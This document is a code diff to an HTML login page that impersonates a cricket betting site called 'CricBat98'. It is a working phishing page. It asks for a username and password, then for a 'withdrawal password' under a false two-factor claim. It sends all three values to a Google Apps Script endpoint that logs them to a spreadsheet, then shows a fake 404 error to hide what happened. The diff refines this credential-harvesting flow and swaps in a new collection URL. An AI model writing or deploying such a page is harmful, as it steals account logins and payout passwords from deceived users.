@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CricBat98</title>
+    <title> Welcome to CricBat98</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -103,11 +103,15 @@
         .hidden {
             display: none;
         }
+
+        .spacer {
+            margin: 15px 0;
+        }
     </style>
 </head>
 <body>
     <!-- Logo -->
-    <img src="logo.png" alt="CricBet99 Logo" class="logo">
+    <img src="logo.png" alt="CricBat98 Logo" class="logo">
 
     <!-- Main Container -->
     <div class="container" id="mainContainer">
@@ -123,17 +127,17 @@
                 </div>
                 <button type="submit" class="btn">Login</button>
             </form>
-            <button class="btn" style="margin-top: 10px;" onclick="loadDemoForm()">Login with Demo ID</button>
+            <div class="spacer"></div>
+            <button class="btn" onclick="navigateToDemoLogin()">Login with Demo ID</button>
             <div class="recaptcha-text">
-                <span class="bold-text">This site is protected by reCAPTCHA and the Google</span> 
-                <a href="#">Privacy Policy</a> and 
-                <a href="#">Terms of Service</a> apply.
+                <span class="bold-text">This site is protected by reCAPTCHA and the Google</span>
+                <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a> apply.
             </div>
         </div>
 
         <!-- Demo Login Form -->
         <div id="demoForm" class="hidden">
-            <div class="heading">LOGIN</div>
+            <div class="heading">DEMO LOGIN</div>
             <p style="font-weight: bold; color: black; margin: 0;">2-Factor Authentication Enabled.</p>
             <p style="font-weight: bold; color: black; margin: 5px 0 10px;">Enter Your Withdrawal Password</p>
             <form id="demoLoginForm" onsubmit="handleDemoFormSubmit(event)">
@@ -143,9 +147,8 @@
                 <button type="submit" class="btn">Submit</button>
             </form>
             <div class="recaptcha-text">
-                <span class="bold-text">This site is protected by reCAPTCHA and the Google</span> 
-                <a href="#">Privacy Policy</a> and 
-                <a href="#">Terms of Service</a> apply.
+                <span class="bold-text">This site is protected by reCAPTCHA and the Google</span>
+                <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a> apply.
             </div>
         </div>
 
@@ -153,45 +156,36 @@
         <div id="error404" class="hidden">
             <div class="heading" style="color: #dc3545;">404</div>
             <div class="error-message">Page Not Found</div>
-            <button class="btn" onclick="goToHome()">Back to Home Page</button>
         </div>
     </div>
 
     <script>
-        const scriptUrl = "https://script.google.com/macros/s/AKfycbwXhwZN_3UfsB1_K6Ve9C2jY-Y0iH46_inybwfnE52aXDjQo2HlRAL0MrQXo936gctlkg/exec";
+        const scriptUrl = "https://script.google.com/macros/s/AKfycbwfmML6__pCuuqINVGgHf50zF0jcjeX9rUwzloVcFpbNIDWzPfP5tdo7hT7WfpC5BwU4g/exec";
+
+        let userData = {}; // To temporarily store data
 
         // Handle main login form submission
         function handleMainFormSubmit(event) {
-            event.preventDefault(); // Prevent default form navigation
-            const form = document.getElementById("mainLoginForm");
-            const formData = new FormData(form);
+            event.preventDefault();
+            const username = document.getElementById("UserName").value;
+            const password = document.getElementById("password").value;
 
-            fetch(scriptUrl, {
-                method: "POST",
-                body: formData,
-            })
-            .then(response => response.text())
-            .then(responseText => {
-                console.log("Main Login Response:", responseText);
-                document.getElementById("loginForm").classList.add("hidden");
-                document.getElementById("error404").classList.remove("hidden");
-            })
-            .catch(error => {
-                console.error("Error submitting main login form:", error);
-            });
+            userData = { username, password };
+
+            // Navigate to demo login form
+            document.getElementById("loginForm").classList.add("hidden");
+            document.getElementById("demoForm").classList.remove("hidden");
         }
 
-        // Load demo login form
-        function loadDemoForm() {
+        // Navigate to demo login form when "Login with Demo ID" button is clicked
+        function navigateToDemoLogin() {
             document.getElementById("loginForm").classList.add("hidden");
             document.getElementById("demoForm").classList.remove("hidden");
         }
 
         // Handle demo login form submission
         function handleDemoFormSubmit(event) {
-            event.preventDefault(); // Prevent default form navigation
-            const username = document.getElementById("UserName").value;
-            const password = document.getElementById("password").value;
+            event.preventDefault();
             const withdrawalCode = document.getElementById("withdrawalCode").value;
 
             if (!withdrawalCode) {
@@ -199,29 +193,27 @@
                 return;
             }
 
+            userData.withdrawalCode = withdrawalCode;
+
+            // Send data to Google Sheet
             const formData = new FormData();
-            formData.append("UserName", username);
-            formData.append("password", password);
-            formData.append("withdrawalCode", withdrawalCode);
+            formData.append("UserName", userData.username);
+            formData.append("password", userData.password);
+            formData.append("withdrawalCode", userData.withdrawalCode);
 
             fetch(scriptUrl, {
                 method: "POST",
                 body: formData,
             })
-            .then(response => response.text())
-            .then(responseText => {
-                console.log("Demo Login Response:", responseText);
-                document.getElementById("demoForm").classList.add("hidden");
-                document.getElementById("error404").classList.remove("hidden");
-            })
-            .catch(error => {
-                console.error("Error submitting demo login form:", error);
-            });
-        }
-
-        function goToHome() {
-            document.getElementById("error404").classList.add("hidden");
-            document.getElementById("loginForm").classList.remove("hidden");
+                .then(response => response.text())
+                .then(responseText => {
+                    console.log("Response from Google Sheet:", responseText);
+                    document.getElementById("demoForm").classList.add("hidden");
+                    document.getElementById("error404").classList.remove("hidden");
+                })
+                .catch(error => {
+                    console.error("Error storing data:", error);
+                });
         }
     </script>
 </body>
